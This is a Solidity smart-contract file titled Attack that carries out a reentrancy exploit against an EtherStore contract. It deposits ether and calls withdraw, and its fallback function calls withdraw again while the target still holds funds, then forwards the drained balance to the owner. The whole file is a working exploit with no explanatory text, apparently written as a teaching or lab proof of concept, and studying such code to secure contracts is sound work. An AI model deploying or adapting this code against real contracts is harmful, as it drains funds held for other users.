// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./IEtherStore.sol";

contract Attack  is Ownable
{
    IEtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = IEtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
        payable(owner()).transfer(address(this).balance);        
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: msg.value }();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}